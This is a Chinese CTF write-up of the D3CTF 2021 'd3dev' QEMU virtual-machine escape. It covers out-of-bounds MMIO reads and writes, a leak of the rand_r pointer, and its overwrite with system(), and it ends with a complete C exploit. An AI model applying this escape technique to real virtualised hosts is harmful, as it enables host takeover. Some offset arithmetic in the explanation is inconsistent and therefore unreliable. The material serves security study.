---
title: D3CTF 2021 d3dev QEMU Escape Writeup
description: Analysis of the d3dev custom PCI device vulnerability in D3CTF 2021,
  covering OOB read/write via MMIO, leaking QEMU base address via rand_r pointer,
  and overwriting rand_r with system() for code execution.
category: program-analysis
tags:
- QEMU
- VM Escape
- PCI Device
- MMIO
- OOB Read/Write
- CTF Writeup
- D3CTF 2021
date: '2024-01-15'
updated: '2026-11-12'
---
## 概述

本页面记录 D3CTF 2021 中 `d3dev` 题目的完整分析与利用过程。该题目是一个典型的 QEMU 虚拟机逃逸入门挑战，出题者实现了一个名为 `d3dev` 的自定义 PCI 设备，其中存在**边界检查缺失**导致的 MMIO 越界读写漏洞。通过泄露 `rand_r` 函数指针获取 QEMU 基址，再将其覆盖为 `system()` 地址，最终实现任意命令执行。

## 背景知识：QEMU 设备模型与 PCI 设备注册

### QOM (QEMU Object Model) 关键结构

| 结构体 | 作用 |
|--------|------|
| `TypeInfo` | 定义类型元信息，指定对象大小、`class_init`、`instance_init` |
| `ObjectClass` | 类对象，`class_init` 中初始化设备 ID、厂商 ID、实现方法表 |
| `Object` / `xxxState` | 实例对象，`instance_init` 中初始化设备状态字段 |
| `PCIDeviceClass` | PCI 设备特有的类结构，`realize` 中注册 MMIO/IO 空间回调 |

### 本题设备注册流程

1. `pci_d3dev_register_types` → 初始化 `TypeInfo`，绑定 `d3dev_class_init` 与 `d3dev_instance_init`
2. `d3dev_class_init` → 设置 `vendor_id` / `device_id`，绑定 `realize` = `pci_d3dev_realize`
3. `pci_d3dev_realize` → 调用 `pci_register_bar` 注册 MMIO 空间（大小 0x800），回调为 `d3dev_mmio_read` / `d3dev_mmio_write`
4. `d3dev_instance_init` → 初始化 `d3devState` 结构体，关键字段：
   - `blocks`：数据缓冲区
   - `seek`：读写偏移（可通过 PMIO 控制）
   - `key[4]`：编解码密钥（可通过 PMIO 清零）
   - `r_seed`：随机种子，位于 `blocks` 上方
   - `rand_r`：函数指针，指向 QEMU 的 `rand_r`，**位于 `blocks` 下方 0x818 处**

> 在 `lspci -vvv` 中可看到该设备：`00:03.0 Class 00ff: 1234:d3dev`，BAR0 为 MMIO 空间。

## 漏洞分析

### MMIO 读越界 — `d3dev_mmio_read`

```c
uint64_t d3dev_mmio_read(void *opaque, hwaddr addr, unsigned size) {
    d3devState *s = opaque;
    uint64_t val = *(uint64_t *)((char *)s->blocks + s->seek + addr);
    // ... TEA-like 编码循环 ...
    return val;
}
```

- **无边界检查**：`addr` + `seek` 可超出 `blocks` 范围
- `seek` 可通过 PMIO 写入（见下文），配合 `addr` 实现任意相对偏移读
- 返回值经过 **TEA 解码**（密钥为 `key[4]`）

### MMIO 写越界 — `d3dev_mmio_write`

```c
void d3dev_mmio_write(void *opaque, hwaddr addr, uint64_t val, unsigned size) {
    d3devState *s = opaque;
    if (s->mmio_write_part == 0) {
        *(uint32_t *)((char *)s->blocks + s->seek + addr) = (uint32_t)val;
    } else {
        uint32_t old_low  = *(uint32_t *)((char *)s->blocks + s->seek + addr);
        uint32_t old_high = *(uint32_t *)((char *)s->blocks + s->seek + addr + 4);
        uint64_t encoded = encode(old_high, old_low);  // TEA 编码
        *(uint64_t *)((char *)s->blocks + s->seek + addr) = encoded;
    }
}
```

- 两阶段写入机制：
  1. `mmio_write_part == 0`：写入**明文** 32-bit 值
  2. `mmio_write_part == 1`：读取现有 64-bit，TEA 编码后写回
- 利用时先写入目标地址的**低 32-bit 与高 32-bit 明文**，再触发第二阶段写入**编码后的 64-bit 值**，从而绕过编码逻辑直接控制 64-bit 目标（如 `rand_r` 指针）

### PMIO 控制接口 — `d3dev_pmio_write`

| PMIO Offset | 作用 |
|-------------|------|
| `0x04` | 将 `key[0..3]` 全部置零 → 编解码变为恒等变换 |
| `0x08` | 直接写入 `seek` 字段 → 控制 MMIO 读写偏移 |
| `0x1C` | 调用 `s->rand_r(&s->r_seed)` → **触发函数指针调用** |

> PMIO 基址为 `0xc040`（从启动脚本或 `/proc/ioports` 确认），需 `iopl(3)` 权限访问。

## 利用链构造

### 步骤 1：环境准备

```c
// PMIO: 清零 key，使 encode/decode 为恒等函数
pmio_write(0x04, 0);
// PMIO: 设置 seek = 0x100，使 blocks + seek 指向 rand_r 字段（偏移 0x818 - 0x800 = 0x18，加上 MMIO addr 24 = 0x100）
pmio_write(0x08, 0x100);
```

### 步骤 2：泄露 QEMU 基址

```c
// MMIO 读取 addr=24 处的 64-bit（即 rand_r 指针）
uint64_t encoded_rand_r = mmio_read(24);
// 因 key=0，decode 为恒等，直接得到 rand_r 地址
uint64_t rand_r = decode(encoded_rand_r >> 32, encoded_rand_r & 0xffffffff);
uint64_t qemu_base = rand_r - offset_rand_r;  // offset 从本地 QEMU 二进制获取
uint64_t system_addr = qemu_base + offset_system;
```

### 步骤 3：覆盖 rand_r 为 system()

```c
// 编码 system 地址（key=0 时 encode 也是恒等，但保持流程一致）
uint64_t encoded_system = encode(system_addr >> 32, system_addr & 0xffffffff);

// 两阶段写入：
// 1. mmio_write_part=0 写入低 32-bit
mmio_write(24, (uint32_t)encoded_system);
sleep(1);  // 等待内部状态切换 mmio_write_part 为 1
// 2. 再次写入同一地址，触发 mmio_write_part=1 逻辑，写入高 32-bit 并组合为 64-bit
mmio_write(24, (uint32_t)(encoded_system >> 32));
```

### 步骤 4：构造命令参数并触发

```c
// r_seed 位于 blocks 上方，blocks[0] 即 r_seed 低 4 字节
// MMIO 写入 "flag" 到 blocks[0] (addr=0)
mmio_write(0, 0x67616c66);  // "flag"

// PMIO 将 r_seed 高 4 字节设为 "cat "
pmio_write(0x1C, 0x20746163);  // 同时触发 rand_r(&r_seed) → system("cat flag")
```

## 关键技术点总结

| 技术点 | 说明 |
|--------|------|
| **MMIO 越界读写** | 缺乏边界检查，配合可控 `seek` 实现任意相对偏移访问 |
| **PMIO 辅助控制** | 通过 IO 端口控制 `seek`、`key`、触发调用，扩大攻击面 |
| **TEA 编解码绕过** | 将 `key` 清零使编解码失效，或利用两阶段写入特性绕过编码 |
| **函数指针劫持** | `rand_r` 存储在设备状态结构体中，相对偏移固定，覆盖为 `system` |
| **参数构造** | 利用相邻字段 `r_seed` 作为命令字符串缓冲区，拼接 `"cat flag"` |

## 完整 Exp 代码 (C)

```c
#include <stdint.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/io.h>
#include <stdio.h>
#include <unistd.h>

unsigned char* mmio_mem;
void setup_mmio() {
    int mmio_fd = open("/sys/devices/pci0000:00/0000:00:03.0/resource0", O_RDWR | O_SYNC);
    mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
}
void mmio_write(uint32_t addr, uint32_t value) {
    *((uint32_t*)(mmio_mem + addr)) = value;
}
uint64_t mmio_read(uint64_t addr) {
    return *((uint64_t *)(mmio_mem + addr));
}

uint32_t pmio_base = 0xc040;
void setup_pmio() { iopl(3); }
void pmio_write(uint32_t addr, uint32_t value){ outl(value, pmio_base + addr); }
uint64_t pmio_read(uint32_t addr){ return (uint64_t)inl(pmio_base + addr); }

// TEA 解码 (key=0 时为恒等，保留以兼容性)
uint64_t decode(uint32_t high, uint32_t low) {
    uint32_t addr = 0;
    for (int i = 0; i < 32; ++i) {
        addr -= 0x61C88647;
        low  += ((high + addr) ^ (high >> 5) ^ (16 * high));
        high += ((low  + addr) ^ (low  >> 5) ^ (16 * low));
    }
    return (uint64_t)high << 32 | low;
}
// TEA 编码
uint64_t encode(uint32_t high, uint32_t low) {
    uint32_t addr = 0xC6EF3720;
    for (int i = 0; i < 32; ++i) {
        high -= ((low + addr) ^ (low >> 5) ^ (16 * low));
        low  -= ((high + addr) ^ (high >> 5) ^ (16 * high));
        addr += 0x61C88647;
    }
    return (uint64_t)high << 32 | low;
}

int main() {
    printf("Begin\n");
    setup_pmio();
    setup_mmio();
    printf("Setup over\n");

    // 1. 清零 key，设置 seek 指向 rand_r
    pmio_write(0x08, 0x100);
    pmio_write(0x04, 0x0);

    // 2. 泄露 rand_r
    uint64_t value = mmio_read(24);
    uint64_t rand_r = decode(value >> 32, value & 0xffffffff);
    printf("rand_r = %lx\n", rand_r);

    // 3. 计算 system 偏移 (本地调试得知 rand_r -> system = +0xa560)
    uint64_t system = rand_r + 0xa560;
    printf("system = %lx\n", system);

    // 4. 两阶段覆盖 rand_r
    uint64_t enc_sys = encode(system >> 32, system & 0xffffffff);
    mmio_write(24, (uint32_t)enc_sys);
    sleep(1);
    mmio_write(24, (uint32_t)(enc_sys >> 32));

    // 5. 构造参数 "cat flag" 并触发
    pmio_write(0x08, 0x0);          // seek 归零指向 blocks[0]
    mmio_write(0, 0x67616c66);      // blocks[0] = "flag"
    pmio_read(0x08);                // dummy read
    pmio_write(0x1C, 0x20746163);   // r_seed 高位 = "cat " 并调用 system

    return 0;
}
```

## 相关概念与延伸阅读

- [[linux-kernel-hardening-mechanisms]] — 了解内核/虚拟化层面的缓解措施（如 CFI、指针加密）对该类利用的影响
- QEMU 官方文档：[PCI Device Emulation](https://qemu-project.gitlab.io/qemu/system/devices/pci.html)
- 《QEMU Pwn 入门》系列文章（文中参考链接）

## 参考资料

1. 原文微信公众号文章：<http://mp.weixin.qq.com/s?__biz=MzU5MjMzODY0NQ==&mid=2247484215&idx=3&sn=f863a0f5bec374b04ddf3cbac02b64fd>
2. QEMU Pwn 基础知识：<http://mp.weixin.qq.com/s?__biz=MzI2ODM4NzUyNQ==&mid=2247483849&idx=1&sn=b5a444a52222b1877db76816a6133b84>

---
*页面维护者：数字知识库策展人*  
*最后更新：2024-01-15*

## 来源

- [0th3rs安全团队-201911-202204_050](../sources/0th3rs安全团队-201911-202204_050.md)
